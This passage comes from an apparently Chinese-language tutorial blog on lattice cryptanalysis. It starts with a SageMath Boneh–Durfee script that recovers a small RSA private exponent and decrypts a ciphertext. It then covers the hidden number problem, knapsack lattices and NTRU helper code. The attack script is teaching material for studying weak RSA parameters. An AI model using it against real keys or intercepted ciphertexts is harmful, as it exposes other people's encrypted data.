vector)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span></span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == <span class="number">-1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(current, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">&quot;* removing unhelpful vector&quot;</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii - <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> range(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(</span><br><span class="line">                        bound - BB[ii, ii]):</span><br><span class="line">                    <span class="keyword">print</span> (<span class="string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="string">&quot;and&quot;</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii - <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u,x,y&gt;= PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x * y + <span class="number">1</span> - u)  <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX * YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> range(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> range(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x ^ ii * modulus ^ (mm - kk) * polZ(u, x, y) ^ kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm / tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y ^ jj * polZ(u, x, y) ^ kk * modulus ^ (mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift)  <span class="comment"># substitution</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm / tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u ^ kk * y ^ jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = len(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU, XX, YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus ^ mm, nn - <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus ^ mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus ^ (mm * nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>, <span class="number">-1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus ^ mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> range(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> range(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt;= PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(nn):</span><br><span class="line">                pol1 += monomials[jj](w * z + <span class="number">1</span>, w, z) * BB[pol1_idx, jj] / monomials[jj](UU, XX, YY)</span><br><span class="line">                pol2 += monomials[jj](w * z + <span class="number">1</span>, w, z) * BB[pol2_idx, jj] / monomials[jj](UU, XX, YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt;= PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example</span>():</span></span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = </span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = </span><br><span class="line">    <span class="comment"># the cipher</span></span><br><span class="line">    c = </span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">.18</span>  <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span>  <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = int((<span class="number">1</span> - <span class="number">2</span> * delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span> * floor(N ^ delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N ^ (<span class="number">1</span> / <span class="number">2</span>))  <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don&#x27;t touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt;= PolynomialRing(ZZ)</span><br><span class="line">    A = int((N + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;=== checking values ===&quot;</span>)</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;* delta:&quot;</span>, delta)</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;* delta &lt; 0.292&quot;</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;* size of e:&quot;</span>, int(log(e) / log(<span class="number">2</span>)))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;* size of N:&quot;</span>, int(log(N) / log(<span class="number">2</span>)))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;* m:&quot;</span>, m, <span class="string">&quot;, t:&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;=== running algorithm ===&quot;</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = int(pol(solx, soly) / e)</span><br><span class="line">        m = pow(c, d, N)</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&#x27;[-]d is &#x27;</span> + str(d))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&#x27;[-]m is: &#x27;</span> + str(m))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&#x27;[-]hex(m) is: &#x27;</span> + <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.format(int(m)))</span><br><span class="line">        <span class="comment"># print (&#x27;[-]str(m) is: &#x27; + &#x27;&#123;:x&#125;&#x27;.format(int(m)).decode(&#x27;hex&#x27;))</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;[!]no solution was found!&quot;</span>)</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&#x27;[!]All Done!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">&quot;[!]Timer: %s s&quot;</span> % (time.time() - start_time))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&#x27;[!]All Done!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">example()</span><br></pre></td></tr></table></figure><h3 id="HNP-Hidden-number-problem"><a href="#HNP-Hidden-number-problem" class="headerlink" title="HNP (Hidden number problem)"></a>HNP (Hidden number problem)</h3><p>给定一个大质数 $p$ ，和许多 $t\in\mathbb{F_p}$ 和其对应的 $MSB_{l,p}(\alpha\cdot t)$ ，来找 $\alpha$。</p><blockquote><p>啥是 $MSB$ ？</p><p>$MSB_{l,p}(x)$ 表示的是任意一个满足 $|(x\ mod\ p)-u|\leq\frac{p}{2^{l+1}}$ 的 $u$ 。</p><p>也就是说， $MSB_{l,p}(x)$ 可以看成 $x\ mod\ p$ 的 $l$ 个有效高位。</p></blockquote><p>所以看起来是不是挺像 $A\cdot x+B$ ？所以我们或许可以简化这个问题。比方说把它变成下面这个问题：</p><p>如果我们有这些关系，并且有所有的 $A$ 和 $B$ ，来求最开始的 $x$。<br>$$<br>{\begin{cases}<br>A_1\times x+B_1=y_1 \\<br>A_2\times y_1+B_2=y_2 \\<br>\cdots \\<br>A_n\times y_{n-1}+B_x=y_n<br>\end{cases}}<br>\pmod{m}<br>$$<br>当然这个 $x$ 是小于一个上限 $N$ （upper_bound）的。</p><p>多变量问题显然是困难的，为了减少变量，我们可以将这类关系进行迭代：<br>$$<br>y_2=A_2\times y_1+B_2 \\<br>=A_2\times(A_1\times x+B_1)+B_2 \\<br>=A_1A_2\times x+A_2B_1+B_2 \\<br>=A_2’\times x+B_2’<br>$$<br>所以这时，我们得到的就是关于唯一自变量 $x$ 的约束集了。那么我们将这个约束可以写成这样的矩阵：<br>$$<br>M={\begin{bmatrix}<br>m\\<br>&amp;m\\<br>&amp;&amp;\ddots\\<br>&amp;&amp;&amp;m\\<br>A_1&amp;A_2’&amp;\cdots&amp;A_n’&amp;1\\<br>B_1&amp;B_2’&amp;\cdots&amp;B_n’&amp;&amp;base\\<br>\end{bmatrix}}<br>$$<br>而此时一定有 $\vec{v}={\begin{bmatrix}k_1,k_2,\cdots,k_{n-1},x,1\end{bmatrix}}$ 能够满足 $\vec{v}\cdot M=\vec{x}$ ：<br>$$<br>\vec{v}\cdot M<br>={\begin{bmatrix}k_1,k_2,\cdots,k_{n},x,1\end{bmatrix}}\cdot<br>{\begin{bmatrix}<br>m\\<br>&amp;m\\<br>&amp;&amp;\ddots\\<br>&amp;&amp;&amp;m\\<br>A_1&amp;A_2’&amp;\cdots&amp;A_n’&amp;1\\<br>B_1&amp;B_2’&amp;\cdots&amp;B_n’&amp;&amp;base\\<br>\end{bmatrix}}<br>={\begin{bmatrix}y_1,y_2,\cdots,y_n,x,base\end{bmatrix}}<br>=\vec{x}<br>$$<br>那么只要格子构造和优化的足够优秀，LLL格基规约后即可找到这样的 $SVP$ 或者 $CVP$ 。</p><blockquote><p>举个栗子</p><p>倒数第二行是为了保证 $x$ 的大小与其他相同</p><p>倒数第一行是为了保证最后一行的向量只被加了一次</p></blockquote><h3 id="Knapsack-Lattice-0-amp-1knapsack-problem"><a href="#Knapsack-Lattice-0-amp-1knapsack-problem" class="headerlink" title="Knapsack (Lattice 0&amp;1knapsack problem)"></a>Knapsack (Lattice 0&amp;1knapsack problem)</h3><p>高纬度的背包问题，利用一个超级递增序列 $M$ 来表示明文，即</p><p>$$<br>C = \sum_{i=1}^{n}{mbin_i(0\ or\ 1)\times M_i}<br>$$<br>也可以这样理解： $\vec{C}=\vec{m}\cdot\vec{M}$ ，当给出 $\vec{C}$ 与 $\vec{M}$ 时寻找合法的 $\vec{m}$ </p><p>《An Introduction to Mathematical Cryptography-Springer-Verlag》一书中提到LLL方式在背包问题中的应用中构造的格子如下<br>$$<br>B^{knapsack}<br>=<br>{\begin{bmatrix}<br>2&amp;0&amp;0&amp;\cdots&amp;0&amp;m_1 \\<br>0&amp;2&amp;0&amp;\cdots&amp;0&amp;m_2 \\<br>0&amp;0&amp;2&amp;\cdots&amp;0&amp;m_3 \\<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots \\<br>0&amp;0&amp;0&amp;\cdots&amp;2&amp;m_n \\<br>1&amp;1&amp;1&amp;\cdots&amp;1&amp;C<br>\end{bmatrix}}<br>$$<br>LLL后得到的第一个向量取反加一再除2后得到的就是合法的 $\vec{m}$</p><p>但自己在私下想的时候似乎找到了一种另外的解，感觉是对的，但还没仔细证过，构造如下：<br>$$<br>B^{knapsack’}<br>=<br>{\begin{bmatrix}<br>1&amp;0&amp;0&amp;\cdots&amp;0&amp;m_1 \\<br>0&amp;1&amp;0&amp;\cdots&amp;0&amp;m_2 \\<br>0&amp;0&amp;1&amp;\cdots&amp;0&amp;m_3 \\<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots \\<br>0&amp;0&amp;0&amp;\cdots&amp;1&amp;m_n \\<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;-C<br>\end{bmatrix}}<br>$$<br>无论选择哪种变换，一定存在一个 $\vec{x}={\begin{bmatrix}1&amp;1&amp;0&amp;\cdots&amp;0&amp;1&amp;\cdots\end{bmatrix}}$ 满足上述关系，并且应该也是最短的，如果做题的时候找到bug，这里还会回来补</p><h3 id="NTRU"><a href="#NTRU" class="headerlink" title="NTRU"></a>NTRU</h3><p>在讲NTRU之前，先说明几个工具</p><blockquote><p>一般 $n\in(250,2500)$</p><p><code>Zx.&lt;x&gt;</code>表示以 $x$ 为自变量的多项式，比如 $Zx([1,1,4,5,1,4])=1\cdot x^5+1\cdot x^4+5\cdot x^3+4\cdot x^2+1\cdot x+1$</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zx.&lt;x&gt;=ZZ[]</span><br></pre></td></tr></table></figure><h4 id="Cyclic-convolution"><a href="#Cyclic-convolution" class="headerlink" title="Cyclic convolution"></a>Cyclic convolution</h4><p>NTRU中的乘法运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convolution</span>(<span class="params">f,g</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (f*g) % (x^n<span class="number">-1</span>)</span><br></pre></td></tr></table></figure><blockquote><p>这个循环是一个有趣的过程，你可以 通过给 $f(x)$ 乘 $x$ 的不同次方来达到旋转系数的目的</p></blockquote><h4 id="Modular-reduction"><a href="#Modular-reduction" class="headerlink" title="Modular reduction"></a>Modular reduction</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balancedmod</span>(<span class="params">f,q</span>):</span></span><br><span class="line">    g = list(((f[i] + q//<span class="number">2</span>) % q) - q//<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n))</span><br><span class="line">    <span class="keyword">return</span> Zx(g)</span><br></pre></td></tr></table></figure><blockquote><p>是一种特殊的规约（？</p><p>就是使一个多项式的所有系数 $x$ 满足 $x\in(-\frac{q}{2},\frac{q}{2})$ ，变相的模吧</p></blockquote><h4 id="Get-random-polynomials-with-d-nonzero-coefficients"><a href="#Get-random-polynomials-with-d-nonzero-coefficients" class="headerlink" title="Get random polynomials with d nonzero coefficients"></a>Get random polynomials with d nonzero coefficients</h4><p>获得一个只有d项非零系数的多项式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomdpoly</span>(<span class="params">d</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> d &lt;= n</span><br><span class="line">    result = n*[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(d):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            r = randrange(n)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> result[r]: <span class="keyword">break</span></span><br><span class="line">        result[r] = <span class="number">1</span><span class="number">-2</span>*randrange(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> Zx(result)</span><br></pre></td></tr></table></figure><h4 id="Division-modulo-primes"><a href="#Division-modulo-primes" class="headerlink" title="Division modulo primes"></a>Division modulo primes</h4><p>多项式下的对一个质数的倒数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invertmodprime</span>(<span class="params">f,p</span>):</span></span><br><span class="line">  T = Zx.change_ring(Integers(p)).quotient(x^n - <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">return</span> Zx(lift(<span class="number">1</span> / T(f)))</span><br></pre></td></tr></table></figure><blockquote><p>简而言之 $f(x)\cdot invertmodprime(f(x),p)\equiv 1\pmod{p}$ （ $p$ 是一个质数）</p></blockquote><h4 id="Division-modulo-powers-of-2"><a href="#Division-modulo-powers-of-2" class="headerlink" title="Division modulo powers of 2"></a>Division modulo powers of 2</h4><p>（补上）非质数的倒数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invertmodpowerof2</span>(<span class="params">f,q</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> q.is_power_of(<span class="number">2</span>)</span><br><span class="line">    g = invertmodprime(f,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = balancedmod(convolution(g,f),q)</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>: <span class="keyword">return</span> g</span><br><span class="line">        g = balancedmod(convolution(g,<span class="number">2</span> - r),q)</span><br></pre></td></tr></table></figure><h4 id="Messages-for-encryption"><a href="#Messages-for-encryption" class="headerlink" title="Messages for encryption"></a>Messages for encryption</h4><p>随机一个多项式，系数 $x$ 满足 $x\in[1,0,-1]$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span 